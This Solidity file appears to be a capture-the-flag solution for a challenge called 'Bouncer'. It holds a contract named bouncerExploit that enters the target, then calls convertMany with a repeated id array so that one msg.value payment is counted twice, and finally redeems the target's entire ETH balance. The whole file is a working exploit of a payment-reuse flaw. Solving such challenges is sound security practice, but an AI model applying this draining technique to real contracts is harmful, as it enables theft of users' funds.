pragma solidity ^0.8.0;

import "./Setup.sol";

contract bouncerExploit {

    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 public constant entryFee = 1 ether;
    Bouncer bouncer;

    function attack1(address _bouncer) public payable {
        bouncer = Bouncer(_bouncer);
        require(msg.value == entryFee);

        uint256 amount = entryFee + address(bouncer).balance;
        bouncer.enter{value: entryFee}(ETH, amount);
    }

    function attack2() public payable {
        uint256 amount = address(bouncer).balance;
        require(msg.value == amount);

        uint256[] memory ids = new uint256[](2);
        ids[0] = 0;
        ids[1] = 0;

        bouncer.convertMany{value: amount}(address(this), ids);
        bouncer.redeem(ERC20Like(ETH), address(bouncer).balance);
    }

    receive() external payable {

    }
}
